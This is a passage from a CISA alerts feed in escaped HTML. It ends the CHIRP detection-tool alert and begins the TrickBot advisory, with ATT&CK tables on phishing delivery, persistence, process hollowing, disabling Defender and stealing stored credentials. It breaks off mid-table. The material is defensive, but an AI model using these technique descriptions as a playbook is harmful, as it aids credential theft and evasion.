&lt;/ul&gt;

&lt;p&gt;Network defenders can follow step-by-step instructions on the &lt;a href="https://github.com/cisagov/CHIRP"&gt;CISA CHIRP GitHub repository&lt;/a&gt;&amp;nbsp;to add additional IOCs, YARA rules, or plugins to CHIRP to search for post-compromise threat activity related to the SolarWinds Orion supply chain compromise or new threat activity.&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;Compatibility&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;CHIRP currently only scans Windows operating systems.&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;Instructions&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;CHIRP is available on CISA’s GitHub repository in two forms:&lt;/p&gt;

&lt;ol&gt;
	&lt;li&gt;
	&lt;p&gt;A compiled executable&lt;/p&gt;
	&lt;/li&gt;
	&lt;li&gt;
	&lt;p&gt;A python script&lt;/p&gt;
	&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;CISA recommends using the compiled version to easily scan a system for APT activity. For instructions to run, read the README.md in the CHIRP GitHub repository.&lt;/p&gt;

&lt;p&gt;If you choose to use the native Python version, see the detailed instructions on the CHIRP GitHub repository.&lt;/p&gt;
&lt;h3&gt;Mitigations&lt;/h3&gt;&lt;h4&gt;Interpreting the Results&lt;/h4&gt;

&lt;p&gt;CHIRP provides results of its scan in JSON format. CISA encourages uploading the results into a security information and event management (SIEM) system, if available. If no SIEM system is available, results can be viewed in a compatible web browser or text editor. If CHIRP detects any post-compromise threat activity, those detections should be reviewed and confirmed. CISA has provided confidence scores for each IOC and YARA rule included with CHIRP’s release. For confirmed positive hits, CISA recommends collecting a forensic image of the relevant system(s) and conducting a forensic analysis on the system(s).&lt;/p&gt;

&lt;p&gt;If you do not have the capability to follow the guidance in this Alert, consider soliciting third-party IT security support. &lt;strong&gt;Note:&lt;/strong&gt; Responding to confirmed positive hits is essential to evict an adversary from a compromised network.&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;Frequently Asked Questions&lt;/strong&gt;&lt;/h4&gt;

&lt;ol&gt;
	&lt;li&gt;&lt;strong&gt;What systems should CHIRP run on?&lt;/strong&gt;

	&lt;p&gt;Systems running SolarWinds Orion or believed to be involved in any resulting lateral movement.&lt;/p&gt;
	&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;What should I do with results?&lt;/strong&gt;
	&lt;p&gt;Ingest the JSON results into a SIEM system, web browser, or text editor.&lt;/p&gt;
	&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Are there existing tools that CHIRP complements and/or provide the same benefit as CHIRP?&lt;/strong&gt;
	&lt;ol type="a"&gt;
		&lt;li&gt;
		&lt;p&gt;Antivirus software developers may have begun to roll out detections for the SolarWinds post-compromise activity. However, those products can miss historical signs of compromise. CHIRP can provide a complementary benefit to antivirus when run.&lt;/p&gt;
		&lt;/li&gt;
		&lt;li&gt;
		&lt;p&gt;CISA previously released the Sparrow tool that scans for APT activity within M365 and Azure environments related to activity detailed in CISA Alerts AA20-352A and AA21-008A. CHIRP provides a complementary capability to Sparrow by scanning for on-premises systems for similar activity.&lt;/p&gt;
		&lt;/li&gt;
	&lt;/ol&gt;
	&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;How often should I run CHIRP?&lt;/strong&gt;
	&lt;p&gt;CHIRP can be run once or routinely. Currently, CHIRP does not provide a mechanism to run repeatedly in its native format.&lt;/p&gt;
	&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Do I need to configure the tool before I run it?&lt;/strong&gt;
	&lt;p&gt;No.&lt;/p&gt;
	&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;Will CHIRP change or affect anything on the system(s) it runs on?&lt;/strong&gt;
	&lt;p&gt;No, CHIRP only scans the system(s) it runs on and makes no active changes.&lt;/p&gt;
	&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;How long will it take to run CHIRP?&lt;/strong&gt;
	&lt;p&gt;CHIRP will complete its scan in approximately 1 to 2 hours. Duration will be dependent on the level of activity, the system, and the size of the resident data sets. CHIRP will provide periodic progress updates as it runs.&lt;/p&gt;
	&lt;/li&gt;
	&lt;li&gt;&lt;strong&gt;If I have questions, who do I contact?&amp;nbsp;&amp;nbsp;&lt;/strong&gt;
	&lt;p&gt;For general questions regarding CHIRP, please contact CISA via email at &lt;a href="https://us-cert.cisa.govmailto:central@cisa.dhs.gov"&gt;central@cisa.dhs.gov&lt;/a&gt; or by phone at 1-888-282-0870. For reporting indicators of potential compromise, contact us by submitting a report through our website at &lt;a href="https://us-cert.cisa.gov/report"&gt;https://us-cert.cisa.gov/report&lt;/a&gt;. For all technical issues or support for CHIRP, please submit issues at the &lt;a href="https://github.com/cisagov/CHIRP"&gt;CISA CHIRP GitHub Repository&lt;/a&gt;.&amp;nbsp;&lt;/p&gt;
	&lt;/li&gt;
&lt;/ol&gt;
            &lt;h3&gt;Revisions&lt;/h3&gt;
		&lt;ul&gt;			            &lt;li&gt;March 18, 2021: Initial Publication &lt;/li&gt;			            &lt;li&gt;April 9, 2021: Fixed PDF (not related to content)&lt;/li&gt;			            &lt;li&gt;April 15, 2021: Updated with Attribution Statement&lt;/li&gt;		&lt;/ul&gt;
		&lt;hr /&gt;
            &lt;div class="field field--name-body field--type-text-with-summary field--label-hidden field--item"&gt;&lt;p class="privacy-and-terms"&gt;This product is provided subject to this &lt;a href="https://us-cert.cisa.gov/privacy/notification"&gt;Notification&lt;/a&gt; and this &lt;a href="https://www.dhs.gov/privacy-policy"&gt;Privacy &amp;amp; Use&lt;/a&gt; policy.&lt;/p&gt;
&lt;/div&gt;
      </description>
  <pubDate>Thu, 18 Mar 2021 18:00:00 +0000</pubDate>
    <dc:creator>CISA</dc:creator>
    <guid isPermaLink="false">16393 at https://us-cert.cisa.gov</guid>
    </item>
<item>
	<title>AA21-076A: TrickBot Malware</title>
	<link>https://us-cert.cisa.gov/ncas/alerts/aa21-076a</link>
	<description>Original release date: March 17, 2021 | Last revised: May 20, 2021&lt;br/&gt;&lt;h3&gt;Summary&lt;/h3&gt;&lt;p class="tip-intro" style="font-size: 15px;"&gt;&lt;em&gt;This Joint Cybersecurity Advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&amp;amp;CK®) framework, Version 8. See the &lt;a href="https://attack.mitre.org/versions/v8/techniques/enterprise/"&gt;ATT&amp;amp;CK for Enterprise&lt;/a&gt; for all referenced threat actor tactics and techniques.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The Cybersecurity and Infrastructure Security Agency (CISA) and Federal Bureau of Investigation (FBI) have observed continued targeting through spearphishing campaigns using TrickBot malware&amp;nbsp;in North America. A sophisticated group of cybercrime actors is luring victims, via phishing emails, with a traffic infringement phishing scheme to download TrickBot.&lt;/p&gt;

&lt;p&gt;TrickBot—first identified in 2016—is a Trojan developed and operated by a sophisticated group of cybercrime actors. Originally designed as a banking Trojan to steal financial data, TrickBot has evolved into highly modular, multi-stage malware that provides its operators a full suite of tools to conduct a myriad of illegal cyber activities.&lt;/p&gt;

&lt;p&gt;To secure against TrickBot, CISA and FBI recommend implementing the mitigation measures described in this Joint Cybersecurity Advisory, which include blocking suspicious Internet Protocol addresses, using antivirus software, and providing social engineering and phishing training to employees.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://us-cert.cisa.gov/sites/default/files/publications/AA21-076A-TrickBot_Malware_508_0.pdf"&gt;Click here&lt;/a&gt; for a PDF version of this report.&lt;/p&gt;
&lt;h3&gt;Technical Details&lt;/h3&gt;&lt;p&gt;TrickBot is an advanced Trojan that malicious actors spread primarily by spearphishing campaigns using tailored emails that contain malicious attachments or links, which—if enabled—execute malware (&lt;em&gt;Phishing:&lt;/em&gt; &lt;em&gt;Spearphishing Attachment &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1566/001/"&gt;T1566.001&lt;/a&gt;], &lt;em&gt;Phishing: Spearphishing Link&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1566/002"&gt;T1566.002&lt;/a&gt;]). CISA and FBI are aware of recent attacks that use phishing emails, claiming to contain proof of a traffic violation, to steal sensitive information. The phishing emails contain links that redirect to a website hosted on a compromised server that prompts the victim to click on photo proof of their traffic violation. (&lt;em&gt;User Execution: Malicious Link&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1204/001/"&gt;T1204.001&lt;/a&gt;], &lt;em&gt;User Execution: Malicious File&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1204/002/"&gt;T1204.002&lt;/a&gt;]). In clicking the photo, the victim unknowingly downloads a malicious JavaScript file that, when opened, automatically communicates with the malicious actor’s command and control (C2) server to download TrickBot to the victim’s system (&lt;em&gt;Command and Scripting Interpreter: JavaScript&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1059/007/"&gt;T1059.007&lt;/a&gt;]).&lt;/p&gt;

&lt;p&gt;Attackers can use TrickBot to:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Drop other malware, such as Ryuk and Conti ransomware, or&lt;/li&gt;
	&lt;li&gt;Serve as an Emotet downloader (&lt;em&gt;Ingress Tool Transfer&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1105/"&gt;T1105&lt;/a&gt;]).[&lt;a href="https://www.fireeye.com/blog/threat-research/2019/01/a-nasty-trick-from-credential-theft-malware-to-business-disruption.html"&gt;1&lt;/a&gt;]&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;TrickBot uses person-in-the-browser attacks to steal information, such as login credentials (&lt;em&gt;Man in the Browser&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1185/"&gt;T1185&lt;/a&gt;]). Additionally, some of TrickBot’s modules spread the malware laterally across a network by abusing the Server Message Block (SMB) Protocol. TrickBot operators have a toolset capable of spanning the entirety of the MITRE ATT&amp;amp;CK framework, from actively or passively gathering information that can be used to support targeting (&lt;em&gt;Reconnaissance &lt;/em&gt;[&lt;a href="https://attack.mitre.org/tactics/TA0043/"&gt;TA0043&lt;/a&gt;]), to trying to manipulate, interrupt, or destroy systems and data (&lt;em&gt;Impact &lt;/em&gt;[&lt;a href="https://attack.mitre.org/tactics/TA0040/"&gt;TA0040&lt;/a&gt;]).&lt;/p&gt;

&lt;p&gt;TrickBot is capable of data exfiltration over a hardcoded C2 server, cryptomining, and host enumeration (e.g., reconnaissance of Unified Extensible Firmware Interface or Basic Input/Output System [UEFI/BIOS] firmware) (&lt;em&gt;Exfiltration Over C2 Channel &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1041/"&gt;T1041&lt;/a&gt;], &lt;em&gt;Resource Hijacking&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1496"&gt;T1496&lt;/a&gt;], System Information Discovery.[&lt;a href="https://eclypsium.com/2020/12/03/trickbot-now-offers-trickboot-persist-brick-profit/#background"&gt;2&lt;/a&gt;] For host enumeration, operators deliver TrickBot in modules containing a configuration file with specific tasks.&lt;/p&gt;

&lt;p&gt;Figure 1 lays out TrickBot’s use of enterprise techniques.&lt;/p&gt;
&lt;img alt="" data-align="center" data-entity-type="file" data-entity-uuid="a1829818-7626-45e4-8f0a-f4503744f12c" height="800" src="https://us-cert.cisa.gov/sites/default/files/publications/MITRE%20ATT%26CK%20Enterprise%20Techniques_1.png" width="1200" /&gt;
&lt;p class="text-align-center"&gt;&lt;em&gt;Figure 1: MITRE ATT&amp;amp;CK enterprise techniques used by TrickBot &lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;h3&gt;MITRE ATT&amp;amp;CK Techniques&lt;/h3&gt;

&lt;p&gt;According to MITRE, &lt;em&gt;TrickBot&lt;/em&gt; [&lt;a href="https://attack.mitre.org/software/S0266/"&gt;S0266&lt;/a&gt;] uses the ATT&amp;amp;CK techniques listed in table 1.&lt;/p&gt;

&lt;p class="text-align-center"&gt;&lt;em&gt;Table 1: TrickBot ATT&amp;amp;CK techniques for enterprise&lt;/em&gt;&lt;/p&gt;

&lt;p class="text-align-center"&gt;&lt;em&gt;Initial Access&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0001/"&gt;TA0001&lt;/a&gt;]&lt;/p&gt;

&lt;table border="1" cellpadding="1" cellspacing="1" class="general-table" height="156" style="margin-right: auto; margin-left: auto;" width="600"&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;th scope="col" style="width: 203px; text-align: center;"&gt;
			&lt;p&gt;&lt;strong&gt;Technique Title&lt;/strong&gt;&lt;/p&gt;
			&lt;/th&gt;
			&lt;th scope="col" style="width: 118px; text-align: center;"&gt;&lt;strong&gt;ID&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 263px; text-align: center;"&gt;&lt;strong&gt;Use&lt;/strong&gt;&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 203px;"&gt;Phishing: Spearphishing Attachment&lt;/td&gt;
			&lt;td scope="col" style="width: 118px;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1566/001/"&gt;T1566.001&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 263px;"&gt;TrickBot has used an email with an Excel sheet containing a malicious macro to deploy the malware.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 203px;"&gt;Phishing: Spearphishing Link&lt;/td&gt;
			&lt;td scope="col" style="width: 118px;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1566/002"&gt;T1566.002&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 263px; text-align: left;"&gt;
			&lt;p&gt;TrickBot has been delivered via malicious links in phishing emails.&lt;/p&gt;
			&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;

&lt;p class="text-align-center"&gt;&lt;em&gt;Execution&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0002/"&gt;TA0002&lt;/a&gt;]&lt;/p&gt;

&lt;table border="1" cellpadding="1" cellspacing="1" class="general-table" style="width: 600px; height: 312px; margin-right: auto; margin-left: auto;"&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;th scope="col" style="width: 201px; text-align: center;"&gt;&lt;strong&gt;Technique Title&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 120px; text-align: center;"&gt;&lt;strong&gt;ID&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 263px; text-align: center;"&gt;&lt;strong&gt;Use&lt;/strong&gt;&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 201px; text-align: left;"&gt;Scheduled Task/Job: Scheduled Task&lt;/td&gt;
			&lt;td scope="col" style="width: 120px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1053/005/"&gt;T1053.005&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 263px; text-align: left;"&gt;TrickBot creates a scheduled task on the system that provides persistence.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 201px; text-align: left;"&gt;Command and Scripting Interpreter: Windows Command Shell&lt;/td&gt;
			&lt;td scope="col" style="width: 120px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1059/003/"&gt;T1059.003&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 263px; text-align: left;"&gt;TrickBot has used macros in Excel documents to download and deploy the malware on the user’s machine.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 201px; text-align: left;"&gt;Command and Scripting Interpreter: JavaScript/JScript&lt;/td&gt;
			&lt;td scope="col" style="width: 120px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1059/007/"&gt;T1059.007&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 263px; text-align: left;"&gt;TrickBot victims unknowingly download a malicious JavaScript file that, when opened, automatically communicates with the malicious actor’s C2 server to download TrickBot to the victim’s system.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 201px; text-align: left;"&gt;Native API&lt;/td&gt;
			&lt;td scope="col" style="width: 120px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1106"&gt;T1106&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 263px; text-align: left;"&gt;TrickBot uses the Windows Application Programming Interface (API) call, CreateProcessW(), to manage execution flow.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 201px; text-align: left;"&gt;User Execution: Malicious Link&lt;/td&gt;
			&lt;td scope="col" style="width: 120px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1204/001/"&gt;T1204.001&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 263px; text-align: left;"&gt;TrickBot has sent spearphishing emails in an attempt to lure users to click on a malicious link.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 201px; text-align: left;"&gt;User Execution: Malicious File&lt;/td&gt;
			&lt;td scope="col" style="width: 120px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1204/002/"&gt;T1204.002&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 263px; text-align: left;"&gt;TrickBot has attempted to get users to launch malicious documents to deliver its payload.&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;

&lt;p class="text-align-center"&gt;&lt;em&gt;Persistence&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0003/"&gt;TA0003&lt;/a&gt;]&lt;/p&gt;

&lt;table border="1" cellpadding="1" cellspacing="1" class="general-table" height="120" style="margin-right: auto; margin-left: auto;" width="600"&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;th scope="col" style="text-align: center;"&gt;&lt;strong&gt;Technique Title&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 145px; text-align: center;"&gt;&lt;strong&gt;ID&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 257px; text-align: center;"&gt;&lt;strong&gt;Use&lt;/strong&gt;&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Scheduled Task/Job: Scheduled Task&lt;/td&gt;
			&lt;td scope="col" style="width: 145px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1053/005/"&gt;T1053.005&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 257px; text-align: left;"&gt;TrickBot creates a scheduled task on the system that provides persistence.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Create or Modify System Process: Windows Service&lt;/td&gt;
			&lt;td scope="col" style="width: 145px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1543/003/"&gt;T1543.003&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 257px; text-align: left;"&gt;TrickBot establishes persistence by creating an autostart service that allows it to run whenever the machine boots.&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;

&lt;p class="text-align-center"&gt;&lt;em&gt;Privilege Escalation &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0004/"&gt;TA0004&lt;/a&gt;]&lt;/p&gt;

&lt;table border="1" cellpadding="1" cellspacing="1" class="general-table" height="137" style="margin-right: auto; margin-left: auto;" width="600"&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;th scope="col" style="text-align: center;"&gt;&lt;strong&gt;Technique Title&lt;/strong&gt;&lt;/th&gt;
			&lt;th center="" scope="col" style="width: 149px; text-align: center;"&gt;&lt;strong&gt;ID&lt;/strong&gt;&lt;/th&gt;
			&lt;th center="" scope="col" style="width: 253px; text-align: center;"&gt;&lt;strong&gt;Use&lt;/strong&gt;&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Scheduled Task/Job: Scheduled Task&lt;/td&gt;
			&lt;td scope="col" style="width: 149px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1053/005/"&gt;T1053.005&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 253px; text-align: left;"&gt;TrickBot creates a scheduled task on the system that provides persistence.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Process Injection: Process Hollowing&lt;/td&gt;
			&lt;td scope="col" style="width: 149px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1055/012/"&gt;T1055.012&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 253px; text-align: left;"&gt;TrickBot injects into the svchost.exe process.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Create or Modify System Process: Windows Service&lt;/td&gt;
			&lt;td scope="col" style="width: 149px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1543/003/"&gt;T1543.003&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 253px; text-align: left;"&gt;TrickBot establishes persistence by creating an autostart service that allows it to run whenever the machine boots.&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;

&lt;p class="text-align-center"&gt;&amp;nbsp;&lt;em&gt;Defense Evasion&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0005/"&gt;TA0005&lt;/a&gt;]&lt;/p&gt;

&lt;table border="1" cellpadding="1" cellspacing="1" class="general-table" style="margin-right: auto; margin-left: auto;" width="600"&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;th scope="col" style="text-align: center;"&gt;&lt;strong&gt;Technique Title&lt;/strong&gt;&lt;/th&gt;
			&lt;th center="" scope="col" style="width: 143px; text-align: center;"&gt;&lt;strong&gt;ID&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 251px; text-align: center;"&gt;&lt;strong&gt;Use&lt;/strong&gt;&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Obfuscated Files or Information&lt;/td&gt;
			&lt;td scope="col" style="width: 143px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1027"&gt;T1027&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 251px; text-align: left;"&gt;TrickBot uses non-descriptive names to hide functionality and uses an AES CBC (256 bits) encryption algorithm for its loader and configuration files.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Obfuscated Files or Information: Software Packing&lt;/td&gt;
			&lt;td scope="col" style="width: 143px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1027/002/"&gt;T1027.002&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 251px; text-align: left;"&gt;TrickBot leverages a custom packer to obfuscate its functionality.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Masquerading&lt;/td&gt;
			&lt;td scope="col" style="width: 143px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1036"&gt;T1036&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 251px; text-align: left;"&gt;The TrickBot downloader has used an icon to appear as a Microsoft Word document.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Process Injection: Process Hollowing&lt;/td&gt;
			&lt;td scope="col" style="width: 143px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1055/012/"&gt;T1055.012&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 251px; text-align: left;"&gt;TrickBot injects into the svchost.exe process.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Modify Registry&lt;/td&gt;
			&lt;td scope="col" style="width: 143px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1112/"&gt;T1112&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 251px; text-align: left;"&gt;TrickBot can modify registry entries.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;&lt;span style="line-height: 115%; font-family: &amp;quot;Arial&amp;quot;,sans-serif; font-size: 11pt; mso-fareast-font-family: Calibri; mso-fareast-theme-font: minor-latin; mso-ansi-language: EN-US; mso-fareast-language: EN-US; mso-bidi-language: AR-SA;"&gt;Deobfuscate/Decode Files or Information &lt;/span&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 143px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1140"&gt;T1140&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 251px; text-align: left;"&gt;TrickBot decodes the configuration data and modules.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Subvert Trust Controls: Code Signing&lt;/td&gt;
			&lt;td scope="col" style="width: 143px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1553/002/"&gt;T1553.002&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 251px; text-align: left;"&gt;TrickBot has come with a signed downloader component.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left;"&gt;Impair Defenses: Disable or Modify Tools&lt;/td&gt;
			&lt;td scope="col" style="width: 143px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1562/001/"&gt;T1562.001&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 251px; text-align: left;"&gt;TrickBot can disable Windows Defender.&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;

&lt;p class="text-align-center"&gt;&lt;em&gt;Credential Access &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0006/"&gt;TA0006&lt;/a&gt;]&lt;/p&gt;

&lt;table border="1" cellpadding="1" cellspacing="1" class="general-table" height="414" style="margin-right: auto; margin-left: auto;" width="600"&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;th scope="col" style="width: 195px; text-align: center;"&gt;&lt;strong&gt;Technique Title&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 138px; text-align: center;"&gt;&lt;strong&gt;ID&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 251px; text-align: center;"&gt;&lt;strong&gt;Use&lt;/strong&gt;&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 195px; text-align: left;"&gt;Input Capture: Credential API Hooking&lt;/td&gt;
			&lt;td scope="col" style="width: 138px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1056/004/"&gt;T1056.004&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 251px; text-align: left;"&gt;TrickBot has the ability to capture Remote Desktop Protocol credentials by capturing the CredEnumerateA API.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 195px; text-align: left;"&gt;Unsecured Credentials: Credentials in Files&lt;/td&gt;
			&lt;td scope="col" style="width: 138px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1552/001/"&gt;T1552.001&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 251px; text-align: left;"&gt;TrickBot can obtain passwords stored in files from several applications such as Outlook, Filezilla, OpenSSH, OpenVPN and WinSCP. Additionally, it searches for the .vnc.lnk affix to steal VNC credentials.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 195px; text-align: left;"&gt;Unsecured Credentials: Credentials in Registry&lt;/td&gt;
			&lt;td scope="col" style="width: 138px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1552/002/"&gt;T1552.002&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 251px; text-align: left;"&gt;TrickBot has retrieved PuTTY credentials by querying the Software\SimonTatham\Putty\Sessions registry key.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 195px; text-align: left;"&gt;Credentials from Password Stores&lt;/td&gt;
			&lt;td scope="col" style="width: 138px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1555"&gt;T1555&lt;/a&gt;&lt;/td&gt;
